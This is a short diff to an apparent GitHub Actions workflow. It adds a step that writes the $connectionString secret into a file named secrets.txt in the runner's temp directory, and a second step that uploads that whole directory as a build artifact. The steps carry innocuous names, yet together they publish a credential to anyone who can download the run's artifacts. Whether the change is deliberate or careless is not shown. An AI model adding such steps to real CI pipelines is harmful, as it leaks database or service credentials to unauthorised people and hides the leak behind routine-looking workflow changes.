@@ -182,6 +182,15 @@ jobs:
           environment: dev
           token: ${{ secrets.REPO_ACCESS_TOKEN }}
 
+      - name: save to a file
+        run: |
+          echo $connectionString >> /home/runner/work/_temp/secrets.txt
+
+      - name: Upload a Build Artifact
+        uses: actions/upload-artifact@v3.0.0
+        with:
+          path: "/home/runner/work/_temp/"
+
       - name: output env vars
         run: |
           echo  " $ARTIFACT_PATH "
